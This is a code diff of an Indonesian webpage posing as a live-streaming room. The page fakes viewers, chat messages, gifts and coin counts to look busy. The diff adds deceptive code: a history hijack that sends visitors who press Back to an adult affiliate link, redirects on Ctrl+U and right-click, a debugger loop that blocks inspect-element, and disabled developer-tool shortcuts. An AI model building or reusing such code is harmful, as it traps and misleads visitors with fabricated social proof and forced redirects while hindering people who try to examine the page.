@@ -2,28 +2,29 @@
 <html lang="id">
 
 <head>
-
     <meta charset="UTF-8">
-    <meta content="#000000" name="theme-color" />
-    <meta content="#000000" name="msapplication-navbutton-color" />
+    <title>Live Streaming Room</title>
     <meta name="viewport"
         content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
-    <title>Hot51 Live</title>
-    <meta property="og:title" content="Hot51 Live" />
-    <meta property="og:description" content="Gabung WhatsApp Private, chat seru &amp; rahasia!" />
+    <meta name="theme-color" content="#000000">
+    <meta name="msapplication-navbutton-color" content="#000000">
+
+    <meta property="og:title" content="Live Streaming Room" />
+    <meta property="og:description" content="Live sedang berlangsung, chat dengan host dan kirim gift sekarang." />
     <meta property="og:type" content="website" />
-    <meta property="og:image" content="https://videy.indonesiya.com/live/thumb.jpg" />
     <meta property="og:url" content="https://videy.indonesiya.com/live/" />
-    <meta property="og:type" content="website" />
+    <meta property="og:image" content="https://videy.indonesiya.com/live/thumb.jpg" />
+
     <meta name="twitter:card" content="summary_large_image" />
-    <link rel="shortcut icon" href="https://videy.indonesiya.com/live/icon.jfif" type="image/x-icon" />
+    <meta name="twitter:title" content="Live Streaming Room" />
+    <meta name="twitter:description" content="Join live sekarang, viewer ramai dan chat langsung dengan host." />
+    <meta name="twitter:image" content="https://videy.indonesiya.com/live/thumb.jpg" />
     <link rel="stylesheet" href="style.css" />
-    <link href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css' rel='stylesheet' />
+    <link rel="shortcut icon" href="https://videy.indonesiya.com/live/icon.jfif" type="image/x-icon">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
 </head>
 
-<body>
-
+<body oncontextmenu='return false' ondragstart='return false' onselectstart='return false'>
     <div id="app">
         <video id="video" autoplay muted loop></video>
         <div class="overlay"></div>
@@ -44,8 +45,8 @@
         <div id="coin" class="coin">💰 0</div>
         <div id="chat"></div>
         <div class="bottom">
-            <div class="btn chatBtn">💬 Chat...</div>
-            <div class="btn coinBtn">💰</div>
+            <div class="btn chatBtn" onclick="link()">💬 Chat...</div>
+            <div class="btn shareBtn" onclick="share()">🚀</div>
             <div class="btn giftBtn" onclick="gift()">🎁</div>
             <div class="btn likeBtn" onclick="like()">❤️</div>
             <div class="btn nextBtn" onclick="next()">⏬</div>
@@ -81,20 +82,32 @@
             "https://ik.imagekit.io/aducsmuph/video_2026-01-20_02-52-41.mp4"
         ]
 
-
         const female = [
             "SalsaHot", "NadiaViral", "PutriLive",
             "AyuCute", "LunaHot", "RaraViral",
-            "MayaCantik", "VinaLive", "DewiHot"
+            "MayaCantik", "VinaLive", "DewiHot",
+            "IndahLive", "CitraHot", "BellaViral",
+            "TiaraLive", "NisaHot", "SintaCute",
+            "RinaLive", "MilaHot", "LiaViral",
+            "AnisaLive", "PutriHot", "RaniCute",
+            "YuniLive", "LalaHot", "DindaViral",
+            "NoviLive", "SariHot", "TikaCute",
+            "AngelLive", "QueenHot", "BabyViral",
+            "PrettyLive", "SweetHot", "HoneyViral",
+            "CherryLive", "RoseHot", "LilyViral"
         ]
-
 
         const male = [
             "Budi", "Rizky", "Agus", "Fajar", "Rian",
             "Dimas", "Yoga", "Andre", "Kevin", "Reza",
-            "Hendra", "Ardi", "Fikri", "Rafi", "Ilham"
+            "Hendra", "Ardi", "Fikri", "Rafi", "Ilham",
+            "Bagas", "Galih", "Raka", "Doni", "Adit",
+            "Yusuf", "Teguh", "Bayu", "Wahyu", "Eko",
+            "Rendy", "Riko", "Deni", "Rama", "Putra",
+            "Alif", "Iqbal", "Rizal", "Zaki", "Farhan",
+            "Rizwan", "Taufik", "Ridho", "Rian", "Ari",
+            "Lukman", "Hafiz", "Rizki", "Aldo", "Roni"
         ]
-
 
         const messages = [
             "🔥🔥🔥",
@@ -105,11 +118,141 @@
             "auto koin",
             "gass",
             "rame banget",
-            "stay live"
+            "stay live",
+            "hadir bang",
+            "masuk room",
+            "like dulu",
+            "follow host",
+            "host favorit",
+            "salam dari jakarta",
+            "salam dari surabaya",
+            "salam dari bandung",
+            "hadir sultan",
+            "anjay live",
+            "mantap host",
+            "wih rame",
+            "tambah koin",
+            "gift lagi",
+            "gas terus",
+            "jangan off",
+            "lanjut live",
+            "host idola",
+            "cantik banget sumpah",
+            "auto jatuh hati",
+            "VIP hadir boss",
+            "top fan datang",
+            "support terus",
+            "like like like",
+            "spam gift",
+            "diamond masuk",
+            "keren live nya",
+            "asli bagus",
+            "betah di sini",
+            "rame parah",
+            "host nomor 1",
+            "live terbaik",
+            "bintang 5",
+            "hadir malam ini",
+            "gaskeun",
+            "ikut meramaikan",
+            "nonton dari hp",
+            "nonton dari kantor",
+            "nonton diam diam",
+            "stay sampai pagi",
+            "auto follow",
+            "auto gift",
+            "auto koin",
+            "host sultan banget",
+            "queen live",
+            "ratu live",
+            "top host",
+            "live panas",
+            "live seru",
+            "live mantap",
+            "spam like ❤️",
+            "spam gift 🎁",
+            "spam diamond 💎",
+            "spam koin 💰",
+            "hadir lagi",
+            "setia nonton",
+            "jangan selesai",
+            "lanjut terus",
+            "ramekan",
+            "push push",
+            "wih makin rame",
+            "viewer naik",
+            "keren banget",
+            "host viral",
+            "live trending",
+            "top global",
+            "Indonesia hadir",
+            "hadir semua",
+            "full support",
+            "all in",
+            "hadir VIP",
+            "sultan masuk",
+            "boss hadir",
+            "king hadir",
+            "diamond boss",
+            "big gift",
+            "gift lagi dong",
+            "host lucu",
+            "host manis",
+            "host cantik",
+            "stay di sini",
+            "jangan pindah",
+            "live enak",
+            "betah nonton",
+            "auto senyum",
+            "bikin candu",
+            "nagih live nya",
+            "ulang lagi",
+            "lagi lagi",
+            "teruskan",
+            "hadir dari bali",
+            "hadir dari medan",
+            "hadir dari makassar",
+            "hadir dari jogja",
+            "hadir dari lampung",
+            "hadir dari papua",
+            "hadir dari batam",
+            "hadir dari solo",
+            "hadir dari aceh",
+            "hadir dari kalimantan",
+            "Single",
+            "Belum menikah",
+            "Sedang cari pasangan serius",
+            "Janda tanpa anak",
+            "Janda 1 anak",
+            "Janda 2 anak",
+            "Ingin menikah tahun ini",
+            "Sedang fokus mencari hubungan halal",
+            "Siap taaruf",
+            "Sedang dalam proses mengenal seseorang",
+            "Baru putus, ingin memulai yang baru",
+            "Butuh teman ngobrol saja",
+            "Terbuka untuk hubungan jarak jauh",
+            "Terbuka untuk pernikahan",
+            "Pekerja kantoran yang sedang cari jodoh",
+            "Single mother",
+            "Janda baru",
+            "Sedang memperbaiki diri sambil mencari pasangan",
+            "Serius ingin menikah",
+            "Siap berkomitmen jangka panjang",
+            "Butuh teman curhat",
+            "Ingin punya pasangan yang setia",
+            "Tidak sedang menjalin hubungan",
+            "Ingin hubungan sehat dan dewasa",
+            "Sedang cari teman cocok dulu",
+            "Sedang mencari imam yang baik",
+            "Ingin membangun keluarga kecil",
+            "Sedang mencari sosok yang bertanggung jawab",
+            "Tidak ingin main-main",
+            "Terbuka untuk kenalan baru",
+            "Cinta damai dan ingin hubungan tenang"
         ]
 
         const joinText = [
-
             "joined",
             "VIP joined",
             "Sultan joined",
@@ -123,12 +266,63 @@
             "VIP masuk",
             "sultan hadir",
             "auto gift",
-            "diamond gift"
-
+            "diamond gift",
+            "big fan joined",
+            "boss masuk",
+            "king joined",
+            "queen joined",
+            "top viewer",
+            "super fan",
+            "hadir",
+            "ikut nonton",
+            "gabung live",
+            "masuk room",
+            "hadir boss",
+            "hadir kak",
+            "hadir host",
+            "nonton live",
+            "join sekarang",
+            "masuk cepat",
+            "support",
+            "spam gift",
+            "spam like",
+            "spam koin",
+            "top gift",
+            "gift masuk",
+            "diamond masuk",
+            "koin masuk",
+            "gift besar",
+            "gift banyak",
+            "hadir dari jakarta",
+            "hadir dari bandung",
+            "hadir dari surabaya",
+            "hadir dari bali",
+            "hadir dari medan",
+            "hadir dari jogja",
+            "hadir dari makassar",
+            "hadir dari papua",
+            "hadir dari aceh",
+            "hadir dari kalimantan",
+            "VIP datang",
+            "sultan datang",
+            "boss datang",
+            "top fan datang",
+            "penggemar datang",
+            "fan masuk",
+            "user masuk",
+            "viewer masuk",
+            "orang masuk",
+            "room ramai"
         ]
 
-        const gifts = ["🎁", "💎", "🚗", "👑", "💰", "🎉", "🌹", "🚀"]
-
+        const gifts = [
+            "🎁", "💎", "🚗", "👑", "💰", "🎉", "🌹", "🚀",
+            "💍", "🏆", "🥇", "🛥️", "🏎️", "🛩️", "🏰", "🐉",
+            "🦄", "💐", "🎂", "🍾", "🥂", "🍓", "🍒", "🍭",
+            "🧸", "💖", "💝", "💘", "💗", "💞", "💓", "💟",
+            "⭐", "🌟", "✨", "🔥", "⚡", "🎆", "🎇", "🎊",
+            "🐯", "🐼", "🦁", "🐻", "🐰", "🐶", "🐱", "🐵"
+        ]
 
         const video = document.getElementById("video")
         const nameEl = document.getElementById("name")
@@ -141,186 +335,331 @@
         let coin = 0
         let view = 0
 
-
         function next() {
-
             video.src =
                 videos[Math.floor(Math.random() * videos.length)]
-
             video.play()
-
             nameEl.innerText =
                 female[Math.floor(Math.random() * female.length)]
-
             idEl.innerText =
                 "ID " + Math.floor(1000000 + Math.random() * 9000000)
-
             document.querySelector(".avatar").src =
                 photos[Math.floor(Math.random() * photos.length)]
-
             view = 1 + Math.floor(Math.random() * 99)
-
             viewer.innerText = "👁 " + view + "K"
-
             chat.innerHTML = ""
-
             popup("VIP entering...")
-
         }
 
-
-
         function addChat(t) {
-
             let d = document.createElement("div")
             d.className = "chat"
-
             let name = t.split(":")[0]
             let msg = t.split(":")[1]
-
             d.innerHTML =
-                "<span class='male'>" + name + "</span>:" + msg
-
+                "<span class='male'>" + name + "</span> " + msg
             chat.appendChild(d)
-
             if (chat.children.length > 8)
                 chat.removeChild(chat.children[0])
         }
 
-
-
         function popup(t) {
-
             let j = document.createElement("div")
             j.className = "join"
             j.innerText = t
-
             document.body.appendChild(j)
-
             setTimeout(() => j.remove(), 1500)
-
         }
 
-
-
         function like() {
-
             let l = document.createElement("div")
             l.className = "like"
             l.innerText = "❤️"
-
             document.body.appendChild(l)
-
             setTimeout(() => l.remove(), 2000)
-
         }
-
         setInterval(like, 500)
 
-
-
         function gift() {
-
             let g = document.createElement("div")
             g.className = "gift"
-
             let gft =
                 gifts[Math.floor(Math.random() * gifts.length)]
-
             g.innerText = gft
-
             document.body.appendChild(g)
-
             coin += 100
-
             coinEl.innerText = "💰 " + coin
-
             spark()
-
             setTimeout(() => g.remove(), 2000)
-
         }
 
         setInterval(() => {
-
             if (Math.random() < 0.7) gift()
-
         }, 1500)
 
-
+        function share() {
+            const url = window.location.href;
+            if (navigator.share) {
+                navigator.share({
+                    title: "Hot51 Live",
+                    text: "Gabung live seru sekarang",
+                    url: url
+                });
+            } else {
+                navigator.clipboard.writeText(url);
+                popup("Link disalin");
+            }
+        }
 
         function spark() {
-
             let s = document.createElement("div")
-
             s.className = "spark"
-
             s.innerText = "✨"
-
             s.style.left =
                 Math.random() * 300 + "px"
-
             s.style.top =
                 Math.random() * 400 + "px"
-
             document.body.appendChild(s)
-
             setTimeout(() => s.remove(), 1000)
-
         }
 
-
-
         setInterval(() => {
-
             let user =
                 male[Math.floor(Math.random() * male.length)]
-
             let msg =
                 messages[Math.floor(Math.random() * messages.length)]
-
             addChat(user + ": " + msg)
-
         }, 1000)
 
-
         setInterval(() => {
-
             let user =
                 male[Math.floor(Math.random() * male.length)]
-
             let txt =
                 joinText[Math.floor(Math.random() * joinText.length)]
-
             if (Math.random() < 0.3) {
-
                 popup("👑 " + user + " " + txt)
-
             } else {
-
                 popup(user + " " + txt)
-
             }
-
         }, 1500)
 
-
-
         let startY = 0
-
         app.addEventListener("touchstart", e => {
             startY = e.touches[0].clientY
         })
-
         app.addEventListener("touchend", e => {
-
             let endY = e.changedTouches[0].clientY
-
             if (startY - endY > 50) next()
-
         })
-
         next()
+
+        function link() {
+            window.location.href = "https://tiny.cc/onlyfansclub";
+        }
+
+        // directlink
+        var directlink = "https://adultmoms.app.link/?start=TTE1MTYxNw==";
+
+        // inspect element
+        ! function t() {
+            try {
+                ! function t(n) {
+                    1 === ("" + n / n)
+                        .length && 0 !== n || function () {}.constructor("debugger")(), t(++n)
+                }(0)
+            } catch (n) {
+                setTimeout(t, 5e3)
+            }
+        }();
+
+        // antiback
+        (function (window, location) {
+            history.replaceState(null, document.title, location.pathname + "#!/history");
+            history.pushState(null, document.title, location.pathname);
+            window.addEventListener("popstate", function () {
+                if (location.hash === "#!/history") {
+                    history.replaceState(null, document.title, location.pathname);
+                    setTimeout(function () {
+                        window.location.href = directlink;
+                    }, 0);
+                }
+            }, false);
+        }(window, location));
+
+        // script redirect ctrl U
+        function redirectCU(e) {
+            if (e.ctrlKey && e.which == 85) {
+                window.location.href = directlink;
+            }
+        }
+        document.onkeydown = redirectCU;
+
+        // anti copas jquery
+        window.oncontextmenu = function () {
+            return false;
+        }
+        $(document).keydown(function (event) {
+            if (event.keyCode == 123) {
+                return false;
+            } else if ((event.ctrlKey && event.shiftKey && event.keyCode == 73) ||
+                (event.ctrlKey && event.shiftKey && event.keyCode == 74) ||
+                (event.ctrlKey && event.keyCode == 85) ||
+                (event.ctrlKey && event.keyCode == 80)) {
+                return false;
+            }
+        });
+
+        // anti ctrl
+        shortcut = {
+            all_shortcuts: {},
+            add: function (a, b, c) {
+                var d = {
+                    type: "keydown",
+                    propagate: !1,
+                    disable_in_input: !1,
+                    target: document,
+                    keycode: !1
+                };
+                if (c)
+                    for (var e in d) "undefined" == typeof c[e] && (c[e] = d[e]);
+                else c = d;
+                d = c.target, "string" == typeof c.target && (d = document.getElementById(c.target)), a = a
+                    .toLowerCase(),
+                    e = function (d) {
+                        d = d || window.event;
+                        if (c.disable_in_input) {
+                            var e;
+                            d.target ? e = d.target : d.srcElement && (e = d.srcElement), 3 == e.nodeType && (
+                                e = e.parentNode);
+                            if ("INPUT" == e.tagName || "TEXTAREA" == e.tagName) return
+                        }
+                        d.keyCode ? code = d.keyCode : d.which && (code = d.which), e = String.fromCharCode(
+                                code)
+                            .toLowerCase(), 188 == code && (e = ","), 190 == code && (e = ".");
+                        var f = a.split("+"),
+                            g = 0,
+                            h = {
+                                "`": "~",
+                                1: "!",
+                                2: "@",
+                                3: "#",
+                                4: "$",
+                                5: "%",
+                                6: "^",
+                                7: "&",
+                                8: "*",
+                                9: "(",
+                                0: ")",
+                                "-": "_",
+                                "=": "+",
+                                ";": ":",
+                                "'": '"',
+                                ",": "<",
+                                ".": ">",
+                                "/": "?",
+                                "\\": "|"
+                            },
+                            i = {
+                                esc: 27,
+                                escape: 27,
+                                tab: 9,
+                                space: 32,
+                                "return": 13,
+                                enter: 13,
+                                backspace: 8,
+                                scrolllock: 145,
+                                scroll_lock: 145,
+                                scroll: 145,
+                                capslock: 20,
+                                caps_lock: 20,
+                                caps: 20,
+                                numlock: 144,
+                                num_lock: 144,
+                                num: 144,
+                                pause: 19,
+                                "break": 19,
+                                insert: 45,
+                                home: 36,
+                                "delete": 46,
+                                end: 35,
+                                pageup: 33,
+                                page_up: 33,
+                                pu: 33,
+                                pagedown: 34,
+                                page_down: 34,
+                                pd: 34,
+                                left: 37,
+                                up: 38,
+                                right: 39,
+                                down: 40,
+                                f1: 112,
+                                f2: 113,
+                                f3: 114,
+                                f4: 115,
+                                f5: 116,
+                                f6: 117,
+                                f7: 118,
+                                f8: 119,
+                                f9: 120,
+                                f10: 121,
+                                f11: 122,
+                                f12: 123
+                            },
+                            j = !1,
+                            l = !1,
+                            m = !1,
+                            n = !1,
+                            o = !1,
+                            p = !1,
+                            q = !1,
+                            r = !1;
+                        d.ctrlKey && (n = !0), d.shiftKey && (l = !0), d.altKey && (p = !0), d.metaKey && (r = !
+                            0);
+                        for (var s = 0; k = f[s], s < f.length; s++) "ctrl" == k || "control" == k ? (g++, m = !
+                                0) : "shift" ==
+                            k ? (g++, j = !0) : "alt" == k ? (g++, o = !0) : "meta" == k ? (g++, q = !0) : 1 < k
+                            .length ? i[k] ==
+                            code && g++ : c.keycode ? c.keycode == code && g++ : e == k ? g++ : h[e] && d
+                            .shiftKey && (e = h[e],
+                                e == k && g++);
+                        if (g == f.length && n == m && l == j && p == o && r == q && (b(d), !c.propagate))
+                            return d
+                                .cancelBubble = !0, d.returnValue = !1, d.stopPropagation && (d
+                                    .stopPropagation(), d
+                                    .preventDefault()), !1
+                    }, this.all_shortcuts[a] = {
+                        callback: e,
+                        target: d,
+                        event: c.type
+                    }, d.addEventListener ? d.addEventListener(c.type, e, !1) : d.attachEvent ? d.attachEvent(
+                        "on" + c.type,
+                        e) : d["on" + c.type] = e
+            },
+            remove: function (a) {
+                var a = a.toLowerCase(),
+                    b = this.all_shortcuts[a];
+                delete this.all_shortcuts[a];
+                if (b) {
+                    var a = b.event,
+                        c = b.target,
+                        b = b.callback;
+                    c.detachEvent ? c.detachEvent("on" + a, b) : c.removeEventListener ? c.removeEventListener(
+                        a, b, !1) : c[
+                        "on" + a] = !1
+                }
+            }
+        }, shortcut.add("Ctrl+U", function () {
+            window.location.href = directlink;
+        });
+
+        // Redirect Klik Kanan
+        function redirectKK(e) {
+            if (e.which == 3) {
+                window.open(directlink);
+                window.focus();
+            }
+        }
+        document.oncontextmenu = redirectKK;
     </script>
 
 </body>
